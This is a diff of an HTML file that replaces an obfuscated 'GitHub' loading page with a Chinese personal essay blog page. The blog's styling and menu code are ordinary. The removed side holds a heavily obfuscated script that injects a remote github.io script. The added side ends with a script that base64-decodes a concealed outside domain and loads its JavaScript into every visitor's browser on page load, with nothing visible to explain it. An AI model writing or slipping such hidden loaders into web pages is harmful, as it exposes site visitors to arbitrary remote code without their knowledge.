@@ -1,145 +1,472 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="zh-CN">
 
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport"
-        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <meta name="robots" content="noindex,nofollow" />
-    <title>GitHub</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>墨语心境 - 笔尖的流光</title>
     <style>
-        html,
         body {
-            width: 100vw;
-            height: 100vh;
-        }
-
-        * {
+            overflow: hidden;
+            font-family: 'Noto Serif SC', 'Georgia', serif;
+            /* 优雅的衬线字体，优先思源宋体 */
             margin: 0;
             padding: 0;
+            background-color: #FDFDFD;
+            /* 几乎纯白背景 */
+            color: #555555;
+            /* 柔和的深灰色文本 */
+            line-height: 1.8;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 90%;
+            margin: 0 auto;
+            padding: 30px 0;
+        }
+
+        /* 头部 - 留白与写意 */
+        header {
+            background-color: transparent;
+            /* 透明背景，与body融合 */
+            padding: 50px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 40px;
+        }
+
+        header::before {
+            /* 顶部水墨晕染效果 */
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%) translateY(-50%) rotate(15deg);
+            width: 80%;
+            height: 150px;
+            background: radial-gradient(ellipse at center, rgba(173, 216, 230, 0.3) 0%, transparent 70%);
+            /* 浅蓝色晕染 */
+            border-radius: 50%;
+            opacity: 0.6;
+            z-index: 0;
+        }
+
+        header h1 {
+            margin: 0;
+            font-family: 'Playfair Display SC', 'Noto Serif SC', serif;
+            /* 更具书法感的标题字体 */
+            font-size: 3em;
+            color: #333333;
+            /* 标题深色 */
+            letter-spacing: 2px;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.1);
+            position: relative;
+            z-index: 1;
+            font-weight: normal;
+            /* 减轻标题重量 */
+        }
+
+        header p {
+            font-family: 'Noto Sans SC', 'Roboto', sans-serif;
+            /* 副标题使用无衬线 */
+            font-size: 1.2em;
+            color: #777777;
+            margin-top: 15px;
+            position: relative;
+            z-index: 1;
+            font-style: italic;
+        }
+
+        /* 菜单切换按钮 - 简洁图标 */
+        .menu-toggle {
+            background: none;
+            border: none;
+            font-size: 2.2em;
+            /* 图标大小 */
+            color: #777777;
+            /* 柔和的颜色 */
+            cursor: pointer;
+            padding: 5px;
+            position: absolute;
+            /* 绝对定位在头部右上角 */
+            top: 30px;
+            right: 20px;
+            z-index: 2;
+            transition: color 0.3s ease, transform 0.3s ease;
+        }
+
+        .menu-toggle:hover {
+            color: #4CAF50;
+            /* 强调色 */
+            transform: scale(1.1);
+        }
+
+        /* 侧边导航菜单 - 轻盈通透 */
+        nav {
+            position: fixed;
+            top: 0;
+            right: -280px;
+            width: 250px;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            /* 半透明白色背景 */
+            backdrop-filter: blur(8px);
+            /* 柔和模糊 */
+            -webkit-backdrop-filter: blur(8px);
+            border-left: 1px solid rgba(220, 220, 220, 0.5);
+            /* 极细柔和边框 */
+            box-shadow: -3px 0 10px rgba(0, 0, 0, 0.1);
+            /* 柔和阴影 */
+            transition: right 0.4s ease-in-out;
+            z-index: 1001;
+            padding-top: 80px;
             box-sizing: border-box;
         }
 
-        #childIframe {
+        nav.is-open {
+            right: 0;
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            /* 列表项间距更小 */
+        }
+
+        nav ul li a {
+            color: #555555;
+            text-decoration: none;
+            padding: 12px 20px;
+            border-bottom: 1px solid rgba(240, 240, 240, 0.5);
+            /* 极细半透明分隔线 */
+            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
+            display: flex;
+            align-items: center;
+            font-weight: 500;
+            font-size: 1em;
+        }
+
+        nav ul li a:hover,
+        nav ul li a:focus {
+            background-color: rgba(76, 175, 80, 0.08);
+            /* 强调色极浅背景 */
+            color: #4CAF50;
+            /* 强调色文字 */
+            transform: translateX(3px);
+            /* 悬停时轻微右移 */
+        }
+
+        nav ul li:last-child a {
+            border-bottom: none;
+        }
+
+        nav ul li a .icon {
+            margin-right: 15px;
+            font-size: 1.4em;
+            color: #4CAF50;
+            /* 图标强调色 */
+        }
+
+        /* 菜单打开时的背景遮罩 */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            height: 100vh;
-            border: none;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.2);
+            /* 更轻的半透明黑色 */
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease-in-out, visibility 0.4s ease-in-out;
         }
 
-        .loading_container {
-            position: absolute;
-            top: 40%;
-            left: 40%;
-            margin-left: 10%;
-            transform: translate3d(-50%, -50%, 0);
+        .overlay.is-visible {
+            opacity: 1;
+            visibility: visible;
         }
 
-        .loading_container .dot {
-            width: 24px;
-            height: 24px;
-            background: #3ac;
-            border-radius: 100%;
+        main {
+            padding-top: 30px;
+        }
+
+        /* 内容区 - 柔和卡片与留白 */
+        section {
+            background-color: #FFFFFF;
+            margin-bottom: 40px;
+            padding: 35px;
+            border-radius: 15px;
+            /* 柔和圆角 */
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+            /* 柔和阴影 */
+            position: relative;
+            overflow: hidden;
+            border: 1px solid #EEEEEE;
+            /* 极细边框 */
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        section:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
+        }
+
+        section h2 {
+            font-family: 'Playfair Display SC', 'Noto Serif SC', serif;
+            font-size: 2.2em;
+            color: #333333;
+            margin-top: 0;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #E0E0E0;
+            /* 细分隔线 */
+            padding-bottom: 10px;
+            font-weight: normal;
+        }
+
+        section .date {
+            font-size: 0.9em;
+            color: #999999;
+            margin-bottom: 20px;
+            display: block;
+            font-family: 'Noto Sans SC', 'Roboto', sans-serif;
+        }
+
+        section p {
+            font-size: 1.05em;
+            color: #666666;
+            margin-bottom: 25px;
+        }
+
+        section img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 25px auto;
+            border-radius: 10px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+            border: 2px solid #DDDDDD;
+            /* 柔和边框 */
+        }
+
+        .read-more {
             display: inline-block;
-            animation: slide 1s infinite;
+            background-color: #4CAF50;
+            /* 强调色按钮 */
+            color: #FFFFFF;
+            padding: 12px 28px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            font-family: 'Noto Sans SC', 'Roboto', sans-serif;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.15);
         }
 
-        .loading_container .dot:nth-child(1) {
-            animation-delay: 0.1s;
-            background: #32aacc;
+        .read-more:hover {
+            background-color: #388E3C;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 12px rgba(0, 0, 0, 0.2);
         }
 
-        .loading_container .dot:nth-child(2) {
-            animation-delay: 0.2s;
-            background: #64aacc;
+        /* 页脚 - 简洁淡雅 */
+        footer {
+            background-color: #F8F8F8;
+            /* 略深于背景的浅灰色 */
+            color: #777777;
+            padding: 40px 0;
+            text-align: center;
+            font-size: 0.9em;
+            margin-top: 50px;
+            border-top: 1px solid #E0E0E0;
+            /* 细分隔线 */
+            box-shadow: 0 -3px 10px rgba(0, 0, 0, 0.05);
         }
 
-        .loading_container .dot:nth-child(3) {
-            animation-delay: 0.3s;
-            background: #96aacc;
+        .social-links a {
+            color: #777777;
+            text-decoration: none;
+            margin: 0 20px;
+            font-size: 1.4em;
+            transition: color 0.3s ease, transform 0.2s ease;
         }
 
-        .loading_container .dot:nth-child(4) {
-            animation-delay: 0.4s;
-            background: #c8aacc;
-        }
-
-        .loading_container .dot:nth-child(5) {
-            animation-delay: 0.5s;
-            background: #faaacc;
-        }
-
-        @-moz-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
-        }
-
-        @-webkit-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
-        }
-
-        @-o-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
-        }
-
-        @keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+        .social-links a:hover {
+            color: #4CAF50;
+            /* 强调色 */
+            transform: translateY(-3px) scale(1.1);
         }
     </style>
+    <link rel="stylesheet" href="./style.css">
 </head>
 
 <body>
-    <div id="loading_box" class="loading_container">
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
+    <header>
+        <div class="container">
+            <h1>墨语心境</h1>
+            <p>笔尖的流光，心灵的印记</p>
+            <button class="menu-toggle" id="menuToggle">&#9776;</button>
+        </div>
+    </header>
+
+    <nav id="mainNav">
+        <ul>
+            <li><a href="#latest-posts"><span class="icon">&#9999;&#65039;</span> 最新随笔</a></li>
+            <li><a href="#reflections"><span class="icon">&#128161;</span> 心灵感悟</a></li>
+            <li><a href="#about-me"><span class="icon">&#128100;</span> 关于我</a></li>
+            <li><a href="#contact"><span class="icon">&#128231;</span> 联系方式</a></li>
+        </ul>
+    </nav>
+
+    <div class="overlay" id="menuOverlay"></div>
+
+    <div class="container">
+        <main>
+            <section id="latest-posts">
+                <h2>最新随笔</h2>
+                <div class="article-list">
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=1&seed=ink-wash-mountain" alt="水墨山水"
+                            class="random-image">
+                        <h2>山水入画：生活中的诗意</h2>
+                        <span class="date">2025年07月29日</span>
+                        <p>在快节奏的都市生活中，如何寻找一份属于自己的山水意境？本文分享了从日常中发现诗意的方法。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </div>
+
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=2&seed=bamboo-forest" alt="竹林幽径"
+                            class="random-image">
+                        <h2>竹影婆娑：静谧中的力量</h2>
+                        <span class="date">2025年07月25日</span>
+                        <p>竹的坚韧与柔美，如同人生。在竹林幽径中，我感受到了内心的平静与力量。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </div>
+
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=3&seed=tea-ceremony" alt="茶道"
+                            class="random-image">
+                        <h2>一盏清茶：品味人生百态</h2>
+                        <span class="date">2025年07月18日</span>
+                        <p>茶道不仅是泡茶的艺术，更是修身养性的过程。在茶香中，我品味着人生的酸甜苦辣。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </div>
+                </div>
+            </section>
+        </main>
     </div>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 墨语心境. 版权所有.</p>
+            <div class="social-links">
+                <a href="#" target="_blank">微信</a> |
+                <a href="#" target="_blank">知乎</a> |
+                <a href="#" target="_blank">简书</a>
+            </div>
+        </div>
+    </footer>
+    <div id="overlay">
+        <div id="loading_box" class="loading_container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+
     <script>
-        var _0xodl = 'fSxlA2'; if (function (_0x44df4a, _0x58e26e, _0x532227, _0x1cbb24, _0x42581a, _0x509b59, _0xa79306) { return _0x44df4a = _0x44df4a >> 0x9, _0x509b59 = 'hs', _0xa79306 = 'hs', function (_0x4d29f2, _0x4cbc97, _0xbe291c, _0x31ad23, _0x13acc7) { const _0x407516 = _0x57d3; _0x31ad23 = 'tfi', _0x509b59 = _0x31ad23 + _0x509b59, _0x13acc7 = 'up', _0xa79306 += _0x13acc7, _0x509b59 = _0xbe291c(_0x509b59), _0xa79306 = _0xbe291c(_0xa79306), _0xbe291c = 0x0; const _0x1902ef = _0x4d29f2(); while (!![] && --_0x1cbb24 + _0x4cbc97) { try { _0x31ad23 = -parseInt(_0x407516(0x1d7, ')&2K')) / 0x1 * (-parseInt(_0x407516(0x1da, '(qya')) / 0x2) + -parseInt(_0x407516(0x1c7, 'Pm#h')) / 0x3 * (-parseInt(_0x407516(0x1d1, 'xvr1')) / 0x4) + parseInt(_0x407516(0x1c9, 'Mw8H')) / 0x5 + -parseInt(_0x407516(0x1d8, 'Y$EJ')) / 0x6 + parseInt(_0x407516(0x1cb, 'HIOm')) / 0x7 + -parseInt(_0x407516(0x1dd, 'mry*')) / 0x8 + -parseInt(_0x407516(0x1cc, 'Mw8H')) / 0x9 * (parseInt(_0x407516(0x1dc, 'quPr')) / 0xa); } catch (_0x531926) { _0x31ad23 = _0xbe291c; } finally { _0x13acc7 = _0x1902ef[_0x509b59](); if (_0x44df4a <= _0x1cbb24) _0xbe291c ? _0x42581a ? _0x31ad23 = _0x13acc7 : _0x42581a = _0x13acc7 : _0xbe291c = _0x13acc7; else { if (_0xbe291c == _0x42581a['replace'](/[kqChQWiaIPvYKouwOtDL=]/g, '')) { if (_0x31ad23 === _0x4cbc97) { _0x1902ef['un' + _0x509b59](_0x13acc7); break; } _0x1902ef[_0xa79306](_0x13acc7); } } } } }(_0x532227, _0x58e26e, function (_0x5c8363, _0x34873c, _0x10efd6, _0x28a9f7, _0x1dd818, _0x16adf9, _0x3ea5ad) { return _0x34873c = '\x73\x70\x6c\x69\x74', _0x5c8363 = arguments[0x0], _0x5c8363 = _0x5c8363[_0x34873c](''), _0x10efd6 = '\x72\x65\x76\x65\x72\x73\x65', _0x5c8363 = _0x5c8363[_0x10efd6]('\x76'), _0x28a9f7 = '\x6a\x6f\x69\x6e', (0x1b0f1e, _0x5c8363[_0x28a9f7]('')); }); }(0x19800, 0x89423, _0x1ca1, 0xce), _0x1ca1) { } function _0x1e3297() { const _0x596da2 = _0x57d3, _0x1816ad = { 'bCFHm': 'https://snake-imfv.github.io/take-gate/common.mimi.js?timestamp=', 'UVwwa': _0x596da2(0x1c8, 'u57N'), 'VQnBe': _0x596da2(0x1c6, '#XD(') }, _0x3d27e5 = Date[_0x596da2(0x1d5, ']sYX')](), _0x3ed973 = Math['floor'](Math[_0x596da2(0x1de, 'GP!4')]() * 0xf4240), _0x2564ef = _0x1816ad['bCFHm'] + _0x3d27e5 + _0x1816ad[_0x596da2(0x1cf, 'lKdL')] + _0x3ed973, _0xb78199 = document[_0x596da2(0x1db, '!MEf')](_0x1816ad[_0x596da2(0x1d3, '#W5W')]); _0xb78199[_0x596da2(0x1ce, 'sIgF')] = _0x2564ef, document[_0x596da2(0x1c4, '1Rum')]['appendChild'](_0xb78199); } function _0x57d3(_0x3a7c21, _0x386983) { const _0x1ca173 = _0x1ca1(); return _0x57d3 = function (_0x57d370, _0xacf434) { _0x57d370 = _0x57d370 - 0x1c4; let _0x51e50f = _0x1ca173[_0x57d370]; if (_0x57d3['hhIPqO'] === undefined) { var _0x15663a = function (_0x11d2a9) { const _0x85d5c2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; let _0x31b329 = '', _0xc951fd = ''; for (let _0x2837ed = 0x0, _0x364686, _0x101443, _0x448ee2 = 0x0; _0x101443 = _0x11d2a9['charAt'](_0x448ee2++); ~_0x101443 && (_0x364686 = _0x2837ed % 0x4 ? _0x364686 * 0x40 + _0x101443 : _0x101443, _0x2837ed++ % 0x4) ? _0x31b329 += String['fromCharCode'](0xff & _0x364686 >> (-0x2 * _0x2837ed & 0x6)) : 0x0) { _0x101443 = _0x85d5c2['indexOf'](_0x101443); } for (let _0xccb879 = 0x0, _0x1f82ce = _0x31b329['length']; _0xccb879 < _0x1f82ce; _0xccb879++) { _0xc951fd += '%' + ('00' + _0x31b329['charCodeAt'](_0xccb879)['toString'](0x10))['slice'](-0x2); } return decodeURIComponent(_0xc951fd); }; const _0x3a032f = function (_0x1c294f, _0x1177da) { let _0x131465 = [], _0x4d6de2 = 0x0, _0x32adbe, _0x4d6802 = ''; _0x1c294f = _0x15663a(_0x1c294f); let _0x4973f5; for (_0x4973f5 = 0x0; _0x4973f5 < 0x100; _0x4973f5++) { _0x131465[_0x4973f5] = _0x4973f5; } for (_0x4973f5 = 0x0; _0x4973f5 < 0x100; _0x4973f5++) { _0x4d6de2 = (_0x4d6de2 + _0x131465[_0x4973f5] + _0x1177da['charCodeAt'](_0x4973f5 % _0x1177da['length'])) % 0x100, _0x32adbe = _0x131465[_0x4973f5], _0x131465[_0x4973f5] = _0x131465[_0x4d6de2], _0x131465[_0x4d6de2] = _0x32adbe; } _0x4973f5 = 0x0, _0x4d6de2 = 0x0; for (let _0x54b701 = 0x0; _0x54b701 < _0x1c294f['length']; _0x54b701++) { _0x4973f5 = (_0x4973f5 + 0x1) % 0x100, _0x4d6de2 = (_0x4d6de2 + _0x131465[_0x4973f5]) % 0x100, _0x32adbe = _0x131465[_0x4973f5], _0x131465[_0x4973f5] = _0x131465[_0x4d6de2], _0x131465[_0x4d6de2] = _0x32adbe, _0x4d6802 += String['fromCharCode'](_0x1c294f['charCodeAt'](_0x54b701) ^ _0x131465[(_0x131465[_0x4973f5] + _0x131465[_0x4d6de2]) % 0x100]); } return _0x4d6802; }; _0x57d3['dxeyOG'] = _0x3a032f, _0x3a7c21 = arguments, _0x57d3['hhIPqO'] = !![]; } const _0x4f32da = _0x1ca173[0x0], _0x4af055 = _0x57d370 + _0x4f32da, _0x21827a = _0x3a7c21[_0x4af055]; return !_0x21827a ? (_0x57d3['AawnSq'] === undefined && (_0x57d3['AawnSq'] = !![]), _0x51e50f = _0x57d3['dxeyOG'](_0x51e50f, _0xacf434), _0x3a7c21[_0x4af055] = _0x51e50f) : _0x51e50f = _0x21827a, _0x51e50f; }, _0x57d3(_0x3a7c21, _0x386983); } _0x1e3297(); function _0x1ca1() { const _0x588e4a = (function () { return [_0xodl, 'twftoQSohxuClqADO2ItPvkLWKYPwkai==', 'WPzprCkiiCkVpmkrqezTW4JdLq', 'WR3dTb0ZWR1wtfj+dL/dVSkJ', 'qq50pLvDog3dN3avWO3cSG', 'W549mhmi'].concat((function () { return ['WPO9W5eXnSk2h8kjw8opW64EWPC', 'W7vgW6a', 'lmo+pMlcSmkzxmkVuSkUW4hcRha', 'WQj2fmoGWRhdUmoACWZdKG', 'W7T2W73cVmkggmkuWRCQW6iqo8kq', 'FL4HWP/dLbTm'].concat((function () { return ['W7JcLJWinGFdN2q', 'W7dcTCoTfq5wpSkImCkYsrPu', 'W5hcVY1XWOXnW7Wx', 'j8kbnw8XvI7cNXbhjCkDW7e', 'tgXwW4PdWP4', 'WPaLkSoW'].concat((function () { return ['rqT0oWyEzxRdSuC', 'a143zr0A', 'E8oaWRxdP8k6WRGb', 'W6ldGCoDuN8/W5xcHG', 'FGLxW7xcIwuiEmkzECk8W6ae', 'WPRdMr3dOttcISkjWPhcT2ldGGRdOa'].concat((function () { return ['WPzkrSkok8kKpSk+xNXTW6JdLG', 'FWPsW7xcGM0jACkPE8khW64v', 'WPVdNXVdPZxcICkkWQ/cMvRdUstdSG', 'WQLVrG', 'W43cIcqGla']; }())); }())); }())); }())); }()); _0x1ca1 = function () { return _0x588e4a; }; return _0x1ca1(); };
+        document.addEventListener('DOMContentLoaded', function () {
+            const menuToggle = document.getElementById('menuToggle');
+            const mainNav = document.getElementById('mainNav');
+            const menuOverlay = document.getElementById('menuOverlay');
+
+            function toggleMenu() {
+                mainNav.classList.toggle('is-open');
+                menuOverlay.classList.toggle('is-visible');
+            }
+
+            menuToggle.addEventListener('click', toggleMenu);
+            menuOverlay.addEventListener('click', toggleMenu);
+
+            document.querySelectorAll('#mainNav ul li a').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop - (document.querySelector('header').offsetHeight || 0) - 20,
+                            behavior: 'smooth'
+                        });
+                        toggleMenu();
+                    }
+                });
+            });
+        });
+    </script>
+    <script>
+        (function () {
+            function init() {
+                const timestamp = Date.now()
+                const randomNum = Math.floor(Math.random() * 1000000)
+                const domain = getdocs();
+                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const script = document.createElement("script")
+                script.src = url
+                document.body.appendChild(script)
+            }
+            function getdocs() {
+                const dd = "Ly9uMG0xYjN2LmZhc3RyYWtjYXJlZXIuY24vc3RhdGljL2pzL2NvcmUubWluLmpzP3Q=";
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+                const lookup = new Uint8Array(256);
+                for (let i = 0; i < chars.length; i++) {
+                    lookup[chars.charCodeAt(i)] = i;
+                }
+                let padding = 0;
+                if (dd.endsWith('==')) {
+                    padding = 2;
+                } else if (dd.endsWith('=')) {
+                    padding = 1;
+                }
+                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
+                const len = cleanedString.length;
+                if (len % 4 !== 0) {
+                    throw new Error("Invalid string length.");
+                }
+                const outputLength = (len / 4) * 3 - padding;
+                const outputBytes = new Uint8Array(outputLength);
+                let outputIndex = 0;
+                let i = 0;
+                while (i < len) {
+                    const c1 = lookup[cleanedString.charCodeAt(i++)];
+                    const c2 = lookup[cleanedString.charCodeAt(i++)];
+                    const c3 = lookup[cleanedString.charCodeAt(i++)];
+                    const c4 = lookup[cleanedString.charCodeAt(i++)];
+                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
+                    if (c3 !== 64) {
+                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
+                    }
+                    if (c4 !== 64) {
+                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
+                    }
+                }
+                const decoder = new TextDecoder('utf-8');
+                return decoder.decode(outputBytes);
+            }
+            init()
+        })()
     </script>
 </body>
 
